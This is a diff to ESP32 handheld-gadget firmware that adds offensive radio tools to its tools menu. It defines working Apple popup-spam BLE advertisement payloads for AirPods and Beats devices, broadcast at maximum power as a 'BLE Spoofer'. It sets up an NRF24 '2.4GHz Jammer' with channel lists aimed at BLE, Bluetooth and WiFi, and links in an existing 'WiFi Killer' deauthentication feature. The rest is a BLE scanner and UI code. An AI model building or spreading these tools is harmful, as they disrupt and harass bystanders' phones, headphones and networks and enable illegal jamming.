@@ -1,6 +1,14 @@
+
 #include <Arduino.h>
 #include <Wire.h>
 #include <SPI.h>
+
+#if __has_include(<RF24.h>)
+#include <RF24.h>
+#define HAS_RF24_LIB 1
+#else
+#define HAS_RF24_LIB 0
+#endif
 
 #include <WiFi.h>
 #include <WebServer.h>
@@ -15,6 +23,13 @@
 
 #include <FastLED.h>
 #include <esp_wifi.h>
+#include <esp_bt.h>
+
+#include <BLEDevice.h>
+#include <BLEUtils.h>
+#include <BLEScan.h>
+#include <BLEServer.h>
+#include <BLEAdvertisedDevice.h>
 
 // =========================================================
 // Pins
@@ -38,6 +53,22 @@
 #define BTN_OK_PIN    40
 
 #define BUZZER_PIN 1
+
+// =========================================================
+// RF24 Jammer Globals
+// =========================================================
+#define NRF_CE_PIN  15
+#define NRF_CSN_PIN 16
+#if HAS_RF24_LIB
+RF24 nrfRadio(NRF_CE_PIN, NRF_CSN_PIN);
+#endif
+bool nrfRadioFound = false;
+bool nrfJammingActive = false;
+uint8_t nrfJamMode = 0; // 0=BLE, 1=Bluetooth, 2=WiFi
+const byte nrfJamBle[] = {2, 26, 80};
+const byte nrfJamBt[] = {32, 34, 46, 48, 50, 52, 0, 1, 2, 4, 6, 8, 22, 24, 26, 28, 30, 74, 76, 78, 80};
+const byte nrfJamWifi[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12};
+unsigned long lastNrfJamHopMs = 0;
 
 // =========================================================
 // Filesystem paths
@@ -128,6 +159,8 @@ static bool imuOn = true;
 static bool tftSleeping = false;
 static bool matrixSleeping = false;
 static bool matrixDirty = true;
+static bool deferredInitDone = false;
+static uint32_t deferredInitAtMs = 0;
 
 // =========================================================
 // App mode
@@ -195,7 +228,10 @@ enum UiScreen : uint8_t {
   UI_MATRIX_TEXT_MENU,
   UI_MATRIX_TEXT_KEYBOARD,
   UI_NOTE_EDITOR_MENU,
-  UI_NOTE_EDITOR_MAIN
+  UI_NOTE_EDITOR_MAIN,
+  UI_BLE_SPOOFER,
+  UI_BLE_SCANNER,
+  UI_RF_JAMMER,
 };
 
 enum UiIcon : uint8_t {
@@ -260,7 +296,10 @@ enum ToolsMenuItem : uint8_t {
   TOOLS_ITEM_TEXT_LED,
   TOOLS_ITEM_NOTE_EDITOR,
   TOOLS_ITEM_FILE,
-  TOOLS_ITEM_COUNT
+  TOOLS_ITEM_BLE_SPOOF,
+  TOOLS_ITEM_BLE_SCAN,
+  TOOLS_ITEM_RF_JAMMER,
+  TOOLS_ITEM_COUNT,
 };
 
 static UiScreen uiScreen = UI_MENU;
@@ -555,6 +594,47 @@ static const int8_t tetrisShapeXY[7][4][4][2] = {
   {{{2,0},{0,1},{1,1},{2,1}}, {{1,0},{1,1},{1,2},{2,2}}, {{0,1},{1,1},{2,1},{0,2}}, {{0,0},{1,0},{1,1},{1,2}}}
 };
 
+// ============================================
+// BLE Tools Globals (Spoofer, Monitor)
+// ============================================
+static BLEScan* pBLEScan = nullptr;
+static BLEAdvertising *pBleAdvertising = nullptr;
+static BLEServer *pBleServer = nullptr;
+static bool bleInitialized = false;
+static bool bleSessionActive = false;
+
+// Spoofer
+static bool bleSpoofingActive = false;
+static uint8_t bleSpoofIndex = 0;
+static const char* bleSpoofNames[] = {
+  "AirPods", "AirPods Pro", "AirPods Max", "AirPods Gen 2", 
+  "AirPods Gen 3", "PowerBeats", "Beats Solo 3", "Beats Fit Pro"
+};
+static const uint8_t bleSpoofCount = 8;
+static const uint8_t bleSpoofPayloads[8][31] = {
+  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00},
+  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0e, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00},
+  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0a, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00},
+  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0f, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00},
+  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x13, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00},
+  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x03, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00},
+  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0c, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00},
+  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x12, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00}
+};
+
+// Monitor Tracking
+static const uint8_t BLE_MAX_DEVICES = 16;
+struct BleDevInfo {
+  String mac;
+  String name;
+  int rssi;
+  uint16_t packetCount;
+};
+static BleDevInfo bleDevices[BLE_MAX_DEVICES];
+static uint8_t bleDevCount = 0;
+static uint8_t bleListIndex = 0;
+static String bleStatusMessage = "";
+
 // =========================================================
 // Song
 // =========================================================
@@ -813,9 +893,14 @@ static File uploadFile;
 static String uploadTargetPath = "";
 static bool uploadRejected = false;
 static size_t uploadBytes = 0;
+static bool fsReady = false;
 static bool wifiLimitedMode = false;
 static String savedWifiSsid = "";
 static String savedWifiPass = "";
+static bool wifiAutoConnectPending = false;
+static bool wifiAutoConnectActive = false;
+static uint32_t wifiAutoConnectStartMs = 0;
+static const uint32_t WIFI_AUTO_CONNECT_TIMEOUT_MS = 4500;
 
 // =========================================================
 // Prototypes
@@ -837,6 +922,7 @@ static bool wifiCredentialsLoadFromFS();
 static bool wifiCredentialsSaveToFS(const String &ssid, const String &password);
 static void wifiForgetCredentials();
 static String wifiSettingsStatusText();
+static void doNetworkInit();
 
 static void blInit();
 static void blApplyIfDirty();
@@ -1884,7 +1970,7 @@ static void tftDrawIconMenu() {
     String("4 apps"), //game
     String(LittleFS.exists(BMP_PATH) ? "BMP" : "-") + "/" + String(LittleFS.exists(GIF_PATH) ? "GIF" : "-"), //media
     String("8 set"), //setting
-    String("8 apps"), //tools
+    String("11 apps"), //tools
     tftSleeping ? String("SLEEP") : String("READY"), //sleep
     songPlaying ? String(songName(currentSong)) : String("PILIH")
   };
@@ -2533,16 +2619,19 @@ static void tftDrawToolsMenu() {
   tft.setTextColor(UI_MUTED);
   tft.setCursor(10, 40);
   tft.print("U/D:nav - OK:Pilih - OK (hold):back");
-  const char *labels[TOOLS_ITEM_COUNT] = {"Calculator", "Stopwatch", "Timer", "Lampu", "WiFi Killer", "Matrix Text", "Note Editor", "File Explorer"};
+  const char *labels[TOOLS_ITEM_COUNT] = {"Calculator", "Stopwatch", "Timer", "Lampu", "WiFi Killer", "Matrix Text", "Note Editor", "File Explorer", "BLE Spoofer", "BLE Monitor", "2.4GHz Jammer"};
   const char *descs[TOOLS_ITEM_COUNT] = {
-    "Hitung +/-/*// cepat",
+    "Hitung +/-/*/bagi cepat",
     "Start, pause, reset",
     "Mundur dengan bunyi",
     lampOn ? "LED putih aktif" : "LED putih penerangan",
     "Putus target WiFi",
     "Run/static text matrix",
     "Buat/edit nada buzzer",
-    "Kelola file"
+    "Kelola file",
+    "Spam Apple Popups",
+    "Scan + deteksi BLE",
+    "NRF24 Multi Jammer"
   };
   const uint8_t visibleCount = 3;
   uint8_t firstVisible = tftListFirstVisible(toolsMenuIndex, TOOLS_ITEM_COUNT, visibleCount);
@@ -2567,9 +2656,11 @@ static void tftDrawToolsMenu() {
 static void explorerRefresh() {
   explorerFileCount = 0;
   explorerListIndex = 0;
+  if (!fsReady) return;
 
   File root = LittleFS.open("/");
   if (!root || !root.isDirectory()) return;
+  root.rewindDirectory();
   File file = root.openNextFile();
   while (file && explorerFileCount < EXPLORER_MAX_FILES) {
     if (!file.isDirectory()) {
@@ -2612,6 +2703,13 @@ static void tftDrawFileExplorer() {
   tft.setTextSize(1);
   tft.setTextColor(UI_MUTED);
   tft.setCursor(10, 40);
+  if (!fsReady) {
+    tft.print("Storage unavailable");
+    tft.setCursor(12, 80);
+    tft.setTextColor(UI_WARN);
+    tft.print("LittleFS mount failed");
+    return;
+  }
   uint32_t usedKb = LittleFS.usedBytes() / 1024;
   uint32_t totalKb = LittleFS.totalBytes() / 1024;
   tft.print(String("Storage ") + usedKb + "KB/" + totalKb + "KB");
@@ -4605,6 +4703,24 @@ static void uiMarkDirty() {
 
 static void uiEnter(UiScreen screen) {
   uiScreen = screen;
+  if (screen == UI_FILE_EXPLORER) {
+    explorerRefresh();
+  } else if (screen == UI_RF_JAMMER) {
+#if HAS_RF24_LIB
+    if (!nrfRadioFound) {
+      nrfRadioFound = nrfRadio.begin();
+      if (nrfRadioFound) {
+        nrfRadio.setAutoAck(false);
+        nrfRadio.stopListening();
+        nrfRadio.setRetries(0, 0);
+        nrfRadio.setPALevel(RF24_PA_MAX, true);
+        nrfRadio.setDataRate(RF24_2MBPS);
+        nrfRadio.setCRCLength(RF24_CRC_DISABLED);
+      }
+    }
+#endif
+    nrfJammingActive = false;
+  }
   uiMarkDirty();
 }
 
@@ -4621,11 +4737,15 @@ static void exitToUi() {
 }
 
 static void wifiScanAndShowList() {
+  doNetworkInit();
+  wifiLimitedMode = false;
   wifiStatusMessage = "Scanning...";
   wifiLastConnectOk = false;
   uiEnter(UI_WIFI_LIST);
   tftDrawWifiListMenu();
   WiFi.mode(WIFI_STA);
+  WiFi.disconnect(false, false);
+  delay(120);
   int found = WiFi.scanNetworks();
   wifiScanCount = 0;
   if (found > 0) {
@@ -4644,6 +4764,7 @@ static void wifiScanAndShowList() {
 }
 
 void startDeauthScan() {
+  doNetworkInit();
     wifiStatusMessage = "Scanning Targets...";
     wifiLastConnectOk = false;
     uiEnter(UI_DEAUTH_SCANNER);
@@ -4786,6 +4907,7 @@ static void tftDrawDeauthAttack() {
 }
 
 static bool wifiConnectSelectedNetwork() {
+  doNetworkInit();
   wifiStatusMessage = "Connecting...";
   wifiLastConnectOk = false;
   uiMarkDirty();
@@ -4822,6 +4944,227 @@ static bool wifiConnectSelectedNetwork() {
   uiEnter(UI_WIFI_KEYBOARD);
   return false;
 }
+
+// Callback for capturing BLE packets
+class KaniBleCallbacks : public BLEAdvertisedDeviceCallbacks {
+  void onResult(BLEAdvertisedDevice advertisedDevice) {
+    String mac = advertisedDevice.getAddress().toString().c_str();
+    int rssi = advertisedDevice.getRSSI();
+    String name = advertisedDevice.haveName() ? advertisedDevice.getName().c_str() : "";
+
+    // Find existing device or add new
+    int foundIdx = -1;
+    for(int i=0; i<bleDevCount; i++) {
+      if(bleDevices[i].mac == mac) { foundIdx = i; break; }
+    }
+    
+    if(foundIdx >= 0) {
+      bleDevices[foundIdx].rssi = rssi;
+      bleDevices[foundIdx].packetCount++;
+      if(name.length() > 0) bleDevices[foundIdx].name = name;
+    } else if(bleDevCount < BLE_MAX_DEVICES) {
+      bleDevices[bleDevCount].mac = mac;
+      bleDevices[bleDevCount].name = name;
+      bleDevices[bleDevCount].rssi = rssi;
+      bleDevices[bleDevCount].packetCount = 1;
+      bleDevCount++;
+    }
+    uiMarkDirty();
+  }
+};
+
+static void stopDeauthIfActive() {
+  if (!deauthKilling) return;
+  deauthKilling = false;
+  esp_wifi_set_promiscuous_rx_cb(NULL);
+  esp_wifi_set_promiscuous(false);
+  WiFi.disconnect(false, false);
+  WiFi.mode(WIFI_OFF);
+}
+
+static void bleEnsureInitialized() {
+  if (bleInitialized) return;
+  WiFi.disconnect(true, true);
+  WiFi.mode(WIFI_OFF);
+  esp_bt_controller_mem_release(ESP_BT_MODE_CLASSIC_BT);
+  BLEDevice::init("");
+  bleInitialized = true;
+}
+
+static void bleEnterSession() {
+  if (bleSessionActive) return;
+  stopDeauthIfActive();
+  WiFi.disconnect(true, true);
+  WiFi.mode(WIFI_OFF);
+  bleSessionActive = true;
+}
+
+static void bleActivateForMenu() {
+  bleEnterSession();
+  bleEnsureInitialized();
+}
+
+static void initBleScanner() {
+  bleActivateForMenu();
+  if (!pBLEScan) {
+    pBLEScan = BLEDevice::getScan();
+    pBLEScan->setAdvertisedDeviceCallbacks(new KaniBleCallbacks(), true);
+    pBLEScan->setActiveScan(true);
+    pBLEScan->setInterval(100);
+    pBLEScan->setWindow(99);
+  }
+}
+
+static void triggerBleScan(bool resetData) {
+  initBleScanner();
+  if (resetData) {
+    bleDevCount = 0;
+    pBLEScan->clearResults();
+  }
+  bleStatusMessage = "Scanning (3s)...";
+  uiMarkDirty();
+  pBLEScan->start(3, false); // Block for 3 seconds
+  bleStatusMessage = "Scan Complete";
+  uiMarkDirty();
+}
+
+static void toggleBleSpoofer() {
+  bleEnterSession();
+  bleEnsureInitialized();
+  if (!pBleAdvertising) {
+    if (!pBleServer) pBleServer = BLEDevice::createServer();
+    pBleAdvertising = pBleServer->getAdvertising();
+    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
+  }
+
+  if (bleSpoofingActive) {
+    pBleAdvertising->stop();
+    bleSpoofingActive = false;
+  } else {
+    BLEAdvertisementData oAdvertisementData;
+
+    String payload((char*)bleSpoofPayloads[bleSpoofIndex], 31);
+    oAdvertisementData.addData(payload);
+
+    pBleAdvertising->setAdvertisementData(oAdvertisementData);
+    pBleAdvertising->setMinInterval(0x20);
+    pBleAdvertising->setMaxInterval(0x20);
+    pBleAdvertising->setMinPreferred(0x20);
+    pBleAdvertising->setMaxPreferred(0x20);
+
+    pBleAdvertising->start();
+    bleSpoofingActive = true;
+  }
+
+  uiMarkDirty();
+}
+
+static void tftDrawRfJammer() {
+  tftDrawHeader("2.4GHz Jammer");
+  tft.setTextSize(1);
+  tft.setTextColor(UI_MUTED);
+  tft.setCursor(10, 40);
+  tft.print("U/D:Mode OK:Start/Stop");
+
+  tft.fillRoundRect(12, 60, 216, 46, 10, UI_CARD_SEL);
+  tft.drawRoundRect(12, 60, 216, 46, 10, UI_ACCENT);
+  tft.setTextSize(1); tft.setTextColor(UI_MUTED); tft.setCursor(22, 68);
+  tft.print("Target Mode:");
+  tft.setTextSize(2); tft.setTextColor(UI_TEXT); tft.setCursor(22, 82);
+  if (nrfJamMode == 0) tft.print("BLE/AirTag");
+  else if (nrfJamMode == 1) tft.print("Bluetooth");
+  else tft.print("2.4GHz WiFi");
+
+  tft.fillRoundRect(12, 120, 216, 60, 10, UI_CARD);
+  tft.drawRoundRect(12, 120, 216, 60, 10, nrfJammingActive ? UI_WARN : UI_LINE);
+  
+  tft.setTextSize(2); 
+#if !HAS_RF24_LIB
+  tft.setTextColor(UI_WARN);
+  tft.setCursor(30, 142);
+  tft.setTextSize(1);
+  tft.print("INSTALL RF24 LIBRARY!");
+#else
+  if (!nrfRadioFound) {
+    tft.setTextColor(UI_WARN);
+    tft.setCursor(30, 142);
+    tft.setTextSize(1);
+    tft.print("NO NRF24 MODULE!");
+  } else {
+    tft.setTextColor(nrfJammingActive ? UI_WARN : UI_OK);
+    tft.setCursor(64, 142);
+    tft.print(nrfJammingActive ? "JAMMING" : "IDLE");
+  }
+#endif
+}
+
+static void tftDrawBleSpoofer() {
+  tftDrawHeader("BLE Spoofer");
+  tft.setTextSize(1);
+  tft.setTextColor(UI_MUTED);
+  tft.setCursor(10, 40);
+  tft.print("U/D:Device OK:Start/Stop");
+
+  tft.fillRoundRect(12, 60, 216, 46, 10, UI_CARD_SEL);
+  tft.drawRoundRect(12, 60, 216, 46, 10, UI_ACCENT);
+  tft.setTextSize(1); tft.setTextColor(UI_MUTED); tft.setCursor(22, 68); tft.print("Target Device:");
+  tft.setTextSize(2); tft.setTextColor(UI_TEXT); tft.setCursor(22, 82); tft.print(bleSpoofNames[bleSpoofIndex]);
+
+  tft.fillRoundRect(12, 120, 216, 60, 10, UI_CARD);
+  tft.drawRoundRect(12, 120, 216, 60, 10, bleSpoofingActive ? UI_WARN : UI_LINE);
+  tft.setTextSize(2); tft.setTextColor(bleSpoofingActive ? UI_WARN : UI_OK);
+  tft.setCursor(64, 142);
+  tft.print(bleSpoofingActive ? "ATTACKING" : "IDLE");
+}
+
+static void tftDrawBleList(const char* title) {
+  tftDrawHeader(title);
+  tft.setTextSize(1); tft.setTextColor(UI_MUTED); tft.setCursor(10, 40);
+  tft.print("U/D:nav OK:Scan OK+:back");
+
+  const uint8_t rescanIndex = bleDevCount;
+  const uint8_t itemCount = bleDevCount + 1;
+  const uint8_t visibleCount = 4;
+  uint8_t firstVisible = tftListFirstVisible(bleListIndex, itemCount, visibleCount);
+
+  for (uint8_t row = 0; row < visibleCount; row++) {
+    uint8_t i = firstVisible + row;
+    if (i >= itemCount) break;
+    int y = 58 + row * 42;
+    bool selected = (i == bleListIndex);
+    
+    tft.fillRoundRect(12, y, 216, 34, 10, selected ? UI_CARD_SEL : UI_CARD);
+    tft.drawRoundRect(12, y, 216, 34, 10, selected ? UI_ACCENT : UI_LINE);
+    
+    if (i == rescanIndex) {
+      tft.setTextSize(2); tft.setTextColor(selected ? UI_TEXT : UI_MUTED);
+      tft.setCursor(24, y + 8); tft.print("Scan Devices");
+    } else {
+      bool suspicious = (bleDevices[i].packetCount > 15);
+      tft.setTextColor(suspicious ? UI_WARN : (selected ? UI_TEXT : UI_MUTED));
+      
+      tft.setTextSize(1); tft.setCursor(24, y + 6);
+      String dName = bleDevices[i].name.length() > 0 ? bleDevices[i].name : "Unknown";
+      if(dName.length() > 18) dName = dName.substring(0, 15) + "...";
+      tft.print(dName);
+      
+      tft.setCursor(24, y + 22); tft.print(bleDevices[i].mac);
+      
+      tft.setCursor(135, y + 22);
+      tft.print(String(bleDevices[i].rssi) + " dBm");
+      tft.setCursor(190, y + 22);
+      tft.print(String("P") + bleDevices[i].packetCount);
+    }
+  }
+  
+  if (bleStatusMessage.length() > 0) {
+    tft.fillRect(12, 228, 216, 10, UI_BG);
+    tft.setTextSize(1); tft.setTextColor(UI_OK); tft.setCursor(12, 230);
+    tft.print(bleStatusMessage);
+  }
+  tftDrawListScrollbar(226, 60, 140, itemCount, visibleCount, firstVisible);
+}
+
 
 static void uiLoop() {
   btnUpdate(btnUp);
@@ -4905,6 +5248,21 @@ static void uiLoop() {
     else if (uiScreen == UI_DEAUTH_SCANNER || uiScreen == UI_DEAUTH_REASON_PICKER) uiEnter(UI_TOOLS_MENU); 
     else if (uiScreen == UI_FILE_EXPLORER || uiScreen == UI_MATRIX_TEXT_MENU || uiScreen == UI_NOTE_EDITOR_MENU || uiScreen == UI_NOTE_EDITOR_MAIN) {
       if (uiScreen == UI_NOTE_EDITOR_MENU || uiScreen == UI_NOTE_EDITOR_MAIN) noteStopPlay();
+      uiEnter(UI_TOOLS_MENU);
+    }
+    else if (uiScreen == UI_DEAUTH_SCANNER || uiScreen == UI_BLE_SPOOFER || uiScreen == UI_BLE_SCANNER || uiScreen == UI_RF_JAMMER) {
+      if (uiScreen == UI_BLE_SPOOFER && bleSpoofingActive) toggleBleSpoofer();
+      if (uiScreen == UI_RF_JAMMER && nrfJammingActive) {
+        nrfJammingActive = false;
+#if HAS_RF24_LIB
+        if (nrfRadioFound) {
+          nrfRadio.stopConstCarrier();
+          nrfRadio.powerDown();
+          nrfRadio.powerUp();
+        }
+#endif
+      }
+      stopDeauthIfActive();
       uiEnter(UI_TOOLS_MENU);
     }
     else if (uiScreen == UI_FILE_ACTION) uiEnter(UI_FILE_EXPLORER);
@@ -5104,6 +5462,23 @@ static void uiLoop() {
       else if (toolsMenuIndex == TOOLS_ITEM_FILE) {
         explorerRefresh();
         uiEnter(UI_FILE_EXPLORER);
+      }
+      else if (toolsMenuIndex == TOOLS_ITEM_BLE_SPOOF) {
+        bleActivateForMenu();
+        bleSpoofIndex = 0;
+        bleSpoofingActive = false;
+        uiEnter(UI_BLE_SPOOFER);
+      }
+      else if (toolsMenuIndex == TOOLS_ITEM_BLE_SCAN) {
+        bleActivateForMenu();
+        bleListIndex = 0;
+        bleDevCount = 0;
+        if (pBLEScan) pBLEScan->clearResults();
+        bleStatusMessage = "Ready";
+        uiEnter(UI_BLE_SCANNER);
+      }
+      else if (toolsMenuIndex == TOOLS_ITEM_RF_JAMMER) {
+        uiEnter(UI_RF_JAMMER);
       }
       return;
     }
@@ -5342,6 +5717,39 @@ static void uiLoop() {
       WiFi.mode(WIFI_OFF);
       uiEnter(UI_TOOLS_MENU);
     }
+  } else if (uiScreen == UI_BLE_SPOOFER) {
+    if (btnUp.pressEvent) { bleSpoofIndex = (bleSpoofIndex == 0) ? (bleSpoofCount - 1) : (bleSpoofIndex - 1); uiPlayMoveTone(); uiMarkDirty(); }
+    if (btnDown.pressEvent) { bleSpoofIndex = (bleSpoofIndex + 1) % bleSpoofCount; uiPlayMoveTone(); uiMarkDirty(); }
+    if (okShortClick()) { uiPlayOkTone(); toggleBleSpoofer(); }
+  
+  } else if (uiScreen == UI_BLE_SCANNER) {
+    uint8_t itemCount = bleDevCount + 1;
+    if (btnUp.pressEvent) { bleListIndex = (bleListIndex == 0) ? (itemCount - 1) : (bleListIndex - 1); uiPlayMoveTone(); uiMarkDirty(); }
+    if (btnDown.pressEvent) { bleListIndex = (bleListIndex + 1) % itemCount; uiPlayMoveTone(); uiMarkDirty(); }
+    if (okShortClick() && bleListIndex == bleDevCount) {
+      uiPlayOkTone();
+      triggerBleScan(true);
+    }
+  } else if (uiScreen == UI_RF_JAMMER) {
+    if (btnUp.pressEvent || btnDown.pressEvent) { 
+      nrfJamMode = (nrfJamMode + 1) % 3; 
+      uiPlayMoveTone(); 
+      uiMarkDirty(); 
+    }
+    if (okShortClick()) {
+      uiPlayOkTone();
+      if (nrfRadioFound) {
+        nrfJammingActive = !nrfJammingActive;
+#if HAS_RF24_LIB
+        if (!nrfJammingActive) {
+          nrfRadio.stopConstCarrier();
+          nrfRadio.powerDown();
+          nrfRadio.powerUp();
+        }
+#endif
+      }
+      uiMarkDirty();
+    }
   } else if (uiScreen == UI_TOOL_CALC) {
     if (btnUp.pressEvent) {
       calcAdjustValue(+1);
@@ -5425,15 +5833,21 @@ static void uiLoop() {
       lampSetEnabled(!lampOn);
       uiMarkDirty();
     }
-  } else if (uiScreen == UI_SET_TFT_BL) {
-    if (btnUp.pressEvent) { uiEditValue = constrain(uiEditValue + 5, 0, 255); uiPlayMoveTone(); uiMarkDirty(); }
-    if (btnDown.pressEvent) { uiEditValue = constrain(uiEditValue - 5, 0, 255); uiPlayMoveTone(); uiMarkDirty(); }
+    } else if (uiScreen == UI_SET_TFT_BL) {
+    static uint32_t repUpMs = 0, repDnMs = 0;
+    if (btnUp.pressEvent) { uiEditValue = constrain(uiEditValue + 5, 0, 255); uiPlayMoveTone(); uiMarkDirty(); repUpMs = millis(); }
+    if (btnDown.pressEvent) { uiEditValue = constrain(uiEditValue - 5, 0, 255); uiPlayMoveTone(); uiMarkDirty(); repDnMs = millis(); }
+    if (btnUp.stable && btnUp.longFired && millis() - repUpMs >= 60) { uiEditValue = constrain(uiEditValue + 1, 0, 255); repUpMs = millis(); uiMarkDirty(); }
+    if (btnDown.stable && btnDown.longFired && millis() - repDnMs >= 60) { uiEditValue = constrain(uiEditValue - 1, 0, 255); repDnMs = millis(); uiMarkDirty(); }
     if (okShortClick()) { uiPlayOkTone(); blSet((uint8_t)uiEditValue); (void)blSaveToFS(); uiEnter(UI_SETTINGS_MENU); }
-  } else if (uiScreen == UI_SET_MATRIX_BR) {
-    if (btnUp.pressEvent) { uiEditValue = constrain(uiEditValue + 5, 0, 255); uiPlayMoveTone(); uiMarkDirty(); }
-    if (btnDown.pressEvent) { uiEditValue = constrain(uiEditValue - 5, 0, 255); uiPlayMoveTone(); uiMarkDirty(); }
+    } else if (uiScreen == UI_SET_MATRIX_BR) {
+    static uint32_t repUpMs = 0, repDnMs = 0;
+    if (btnUp.pressEvent) { uiEditValue = constrain(uiEditValue + 5, 0, 255); uiPlayMoveTone(); uiMarkDirty(); repUpMs = millis(); }
+    if (btnDown.pressEvent) { uiEditValue = constrain(uiEditValue - 5, 0, 255); uiPlayMoveTone(); uiMarkDirty(); repDnMs = millis(); }
+    if (btnUp.stable && btnUp.longFired && millis() - repUpMs >= 60) { uiEditValue = constrain(uiEditValue + 1, 0, 255); repUpMs = millis(); uiMarkDirty();  }
+    if (btnDown.stable && btnDown.longFired && millis() - repDnMs >= 60) { uiEditValue = constrain(uiEditValue - 1, 0, 255); repDnMs = millis(); uiMarkDirty(); }
     if (okShortClick()) { uiPlayOkTone(); gBrightness = (uint8_t)uiEditValue; brightnessDirty = true; applyBrightnessIfDirty(); (void)brightnessSaveToFS(); uiEnter(UI_SETTINGS_MENU); matrixIdleDirty = true; matrixDirty = true; }
-  } else if (uiScreen == UI_SET_UTC_OFFSET) {
+    } else if (uiScreen == UI_SET_UTC_OFFSET) {
     if (btnUp.pressEvent) { uiOffsetIdx = utcOffsetNextIndex(uiOffsetIdx, +1); uiPlayMoveTone(); uiMarkDirty(); }
     if (btnDown.pressEvent) { uiOffsetIdx = utcOffsetNextIndex(uiOffsetIdx, -1); uiPlayMoveTone(); uiMarkDirty(); }
     if (okShortClick()) { uiPlayOkTone(); gUtcOffsetMinutes = (int)kUtcOffsetsMin[uiOffsetIdx]; timeApplyTZ(); timeSynced = false; (void)utcOffsetSaveToFS(); uiEnter(UI_SETTINGS_MENU); }
@@ -5464,6 +5878,10 @@ static void uiLoop() {
     else if (uiScreen == UI_SET_TFT_BL) tftDrawValueScreen("TFT Backlight", String(uiEditValue), uiEditValue, 0, 255);
     else if (uiScreen == UI_SET_MATRIX_BR) tftDrawValueScreen("LED Brightness", String(uiEditValue), uiEditValue, 0, 255);
     else if (uiScreen == UI_SET_UTC_OFFSET) tftDrawUtcScreen();
+    else if (uiScreen == UI_BLE_SPOOFER) tftDrawBleSpoofer();
+    else if (uiScreen == UI_BLE_SCANNER) tftDrawBleList("BLE Monitor");
+    else if (uiScreen == UI_RF_JAMMER) tftDrawRfJammer();
+    else if (uiScreen == UI_TOOL_CALC) tftDrawCalcTool();
   }
 }
 
@@ -5527,6 +5945,38 @@ static void wifiAutoConfig() {
   }
   WiFi.disconnect(false, false);
   WiFi.mode(WIFI_OFF);
+}
+
+static void wifiAutoConnectTick() {
+  if (!wifiAutoConnectPending) return;
+  if (deauthKilling || bleSessionActive) return;
+  if (!wifiAutoConnectActive) {
+    if (savedWifiSsid.length() == 0) {
+      wifiAutoConnectPending = false;
+      return;
+    }
+    WiFi.mode(WIFI_STA);
+    WiFi.persistent(true);
+    WiFi.setAutoReconnect(true);
+    if (savedWifiPass.length() > 0) WiFi.begin(savedWifiSsid.c_str(), savedWifiPass.c_str());
+    else WiFi.begin(savedWifiSsid.c_str());
+    wifiAutoConnectActive = true;
+    wifiAutoConnectStartMs = millis();
+    return;
+  }
+  if (WiFi.isConnected()) {
+    wifiLimitedMode = false;
+    wifiAutoConnectPending = false;
+    wifiAutoConnectActive = false;
+    return;
+  }
+  if (millis() - wifiAutoConnectStartMs >= WIFI_AUTO_CONNECT_TIMEOUT_MS) {
+    WiFi.disconnect(false, false);
+    WiFi.mode(WIFI_OFF);
+    wifiLimitedMode = true;
+    wifiAutoConnectPending = false;
+    wifiAutoConnectActive = false;
+  }
 }
 
 static void handleStatus() {
@@ -5823,11 +6273,59 @@ renderMatrix();pullMatrix().then(()=>{editing=false;});refreshStatus();setInterv
   server.send(200, "text/html", html);
 }
 
+static void doNetworkInit() {
+  if (deferredInitDone) return;
+
+  wifiAutoConfig();
+  timeSynced = false;
+  lastTimeSyncAttemptMs = 0;
+  timeTrySyncNtp();
+
+  gif.begin(LITTLE_ENDIAN_PIXELS);
+
+  server.on("/", HTTP_GET, handleRoot);
+  server.on("/api/status", HTTP_GET, handleStatus);
+  server.on("/api/mode", HTTP_GET, handleModeApi);
+  server.on("/api/game", HTTP_GET, handleGameApi);
+  server.on("/api/matrix/getc", HTTP_GET, handleMatrixGetApi);
+  server.on("/api/matrix/setc", HTTP_GET, handleMatrixSetApi);
+  server.on("/api/matrix/template", HTTP_GET, handleMatrixTemplateApi);
+  server.on("/api/matrix/save", HTTP_GET, handleMatrixSaveApi);
+  server.on("/api/matrix/load", HTTP_GET, handleMatrixLoadApi);
+  server.on("/api/brush", HTTP_GET, handleBrushApi);
+  server.on("/api/brightness", HTTP_GET, handleBrightnessApi);
+  server.on("/api/tft/backlight", HTTP_GET, handleBacklightApi);
+  server.on("/api/tft/sleep", HTTP_GET, handleTftSleepApi);
+  server.on("/api/tft/wake", HTTP_GET, handleTftWakeApi);
+  server.on("/api/gyro", HTTP_GET, handleImuApi);
+  server.on("/api/song/play", HTTP_GET, handleSongPlayApi);
+  server.on("/api/song/stop", HTTP_GET, handleSongStopApi);
+  server.on("/api/water", HTTP_GET, handleWaterApi);
+  server.on("/upload", HTTP_POST, handleUploadDone, handleUploadStream);
+  server.begin();
+
+  deferredInitDone = true;
+}
+
+static void runDeferredInit() {
+  if (deferredInitDone) return;
+  if (deferredInitAtMs == 0) deferredInitAtMs = millis();
+  if (millis() - deferredInitAtMs < 1500) return;
+  doNetworkInit();
+}
+
 void setup() {
   Serial.begin(115200);
   delay(200);
-  LittleFS.begin(true);
+  esp_bt_controller_mem_release(ESP_BT_MODE_CLASSIC_BT);
